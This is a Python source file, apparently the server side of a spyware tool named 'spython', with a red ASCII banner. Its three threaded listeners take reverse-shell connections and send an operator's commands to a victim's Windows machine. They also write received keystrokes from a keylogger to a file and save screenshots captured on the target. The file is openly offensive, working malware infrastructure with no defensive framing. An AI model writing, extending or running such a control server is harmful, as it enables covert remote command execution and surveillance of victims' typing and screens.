import socket
import ipaddress
import sys
import threading

from time import sleep
from termcolor import colored


class Server:
    """This class implements the server logic
    """
    def __init__(self,ip:str,port:int):
         self.ip = ip  
         self.port = port

          	  
    def active_connection(self)->None:
          """This method creates an actual socket(main/active connection) and listens for inbound connections, once the
             connection is established, the attacker can run commands on the victim's machine

             :return: None
          """

          prompt = ">".rstrip("\n")
          with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
               sock.bind((self.ip,self.port))
               print(f"[*]Listening on {self.ip}:{self.port}")
               sock.listen(2)
               tgt_sock, addr = sock.accept()
               print(f"[*]Got a connection from {addr[0]}:{addr[1]}")
               tgt_sock.settimeout(3)
               while True:
                  try:
                     cmd = input(prompt)
                     if cmd == "tcp_reverse":
                        prompt = "windows_shell>"
                     elif cmd =="exit":
                        prompt = ">"
                     cmd += "\n"
                     tgt_sock.send(cmd.encode())
                     data = tgt_sock.recv(1024).decode()  	   
                     print(data)
                  except KeyboardInterrupt:
                           exit()               
                  except TimeoutError:
                      continue
                  except ConnectionAbortedError:
                           print("[-]Connection aborted by target machine")
                           exit()
    
    def keylog_connection(self,path:str)->None:
        """This method implements the logic of the keylogger server. The data received is appended to a file and each time 
              the connection is closed, the exception is handled and we listen again for new connection                    
          
          :path: Path of file where keystrokes should be  stored. The file path may be relative or absolute and the file may or may not exist. Moreover, it defaults "logs.txt" in currerent directory
          :return: None
        """
        
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as ksock:
             ksock.bind((self.ip,self.port))
             print(f"[*]Listening on {self.ip}:{self.port}")
             ksock.listen(2)
             tgt_ksock, addr = ksock.accept()
             print(f"[*]Got a connection from {addr[0]}:{addr[1]}")
             
             while True:
                     keystrokes = tgt_ksock.recv(1024).decode()
                     if not keystrokes:
                        break
                     with open(path, "a") as f:
                            f.write(keystrokes)

    def screenshot_connection(self,path:str)->None:
        """This method sets up the server with is listens for inbound connection and saves the binary data received into "path". Note that only binary data of image should be sent to this socket

           :path: Path of file where the image(from target machine) should be  stored. The file path may be relative or absolute and the file may or may not exist. Moreover, it defaults "image.jpeg" in currerent directory
           :return: None
        """
        while True:
          with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
                s_sock.bind((self.ip,self.port))
                s_sock.listen(2)
                print(f"[*]Listening on {self.ip}:{self.port}")
                tgt_s_sock, addr = s_sock.accept()
                print(f"[*]Got a connection from {addr[0]}:{addr[1]}")
                img = tgt_s_sock.recv(2**16)
                if img:
                   with open(path,"wb") as fp:
                        fp.write(img)


           

def main()->None:
    while True:
        HOST = input("Host : ") or "192.168.100.115"
        try:
             IP=ipaddress.IPv4Address(HOST)
        except ipaddress.AddressValueError:
             sys.stderr.write("Invalid IPv4 address\n")
             continue
        try:
            MAIN_PORT = input("Main port:") or 5000
            if MAIN_PORT >1000 and MAIN_PORT < 2**16:
               KLOG_PORT = MAIN_PORT+1
               BIN_PORT = MAIN_PORT+2  
               break
        except ValueError :
            sys.stderr.write(f"Port number must be of base 10 and between 1000 and {2**16}\n")
    KPATH = input("Path of file to save keystrokes: ") or "logs.txt"
    IPATH = input("Path of file to save image: ") or "image.jpeg"
    print(f"[*]Host -> {HOST}")
    print(f"[*]Main port -> {MAIN_PORT}")
    print(f"[*]Keylogger server port(K_PORT or KPORT or KEY PORT) -> {KLOG_PORT}")
    print(f"[*]Image server port -> {BIN_PORT}")
    
    active_server = Server(HOST,MAIN_PORT)
    keylog_server = Server(HOST,KLOG_PORT)
    img_server = Server(HOST,BIN_PORT)
    thread1= threading.Thread(target=active_server.active_connection)
    thread2 = threading.Thread(target=keylog_server.keylog_connection,args=(KPATH,))
    thread3 = threading.Thread(target=img_server.screenshot_connection,args=(IPATH,),daemon=True)
    thread1.start()
    thread2.start()
    thread3.start()
    thread1.join()
    thread2.join()
    thread3.join()
    print("[-]Program ended")

if __name__ == "__main__":
   logo = r"""
   _____  _____ __     __  _______  _    _   ____   _   _ 
  / ____||  __ \\ \   / / |__   __|| |  | | / __ \ | \ | |
 | (___  | |__) |\ \_//     | |   | |__| || |  | ||  \| |
  \___ \ |  ___/  \   /      | |   |  __  || |  | || . ` |
  ____) || |       | |       | |   | |  | || |__| || |\  |
 |_____/ |_|       |_|       |_|   |_|  |_| \____/ |_| \_|
                                                          
                                                          
"""
   msg = "This is the command line interface of spython. Fill in the parametes below to start the sever!"
   print(logo[:141],colored(logo[141:],"red"))
   print(colored(msg,"red"))
   main()